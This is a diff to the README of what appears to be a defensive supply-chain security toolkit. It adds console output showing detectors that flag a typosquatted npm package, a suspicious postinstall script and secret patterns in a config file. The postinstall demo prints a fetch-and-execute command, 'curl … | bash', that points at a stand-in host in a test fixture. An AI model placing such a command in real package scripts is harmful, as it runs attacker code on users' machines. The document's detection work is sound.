@@ -80,6 +80,27 @@ Each detector was tested against crafted fixtures in an isolated sandbox
 - **S-03**: fake secret fixtures → caught **and** exposed a real gap:
   `db_password` slipped past a strict `\b` regex — fixed, re-tested, no value leakage
 
+## See it in action
+
+```console
+$ sentinel-typosquat
+[typosquat jarak=1 TINGGI] lodahs@9.9.9 (npm) mirip 'lodash'
+
+$ sentinel-postinstall
+[mencurigakan skor=4] evil-fixture-pkg@1.0.0 :: postinstall
+  cmd: curl -s http://evil.example/x.sh | bash
+
+$ SENTINEL_SECRETSCAN=1 sentinel-secretscan
+[secret aws-key] ./app.conf:2
+[secret generic] ./app.conf:3
+# values are never printed — only pattern type + file:line
+
+$ sentinel-diff
+=== Sentinel diff 2026-10-16 ===
+baru: 0 | hilang: 0 | total kini: 90
+# ...and when there's nothing to report, tools stay silent.
+```
+
 ## Experimental
 
 - `ide-liar-GATE.md` — canary honeypot (deployed) and self-attack simulator
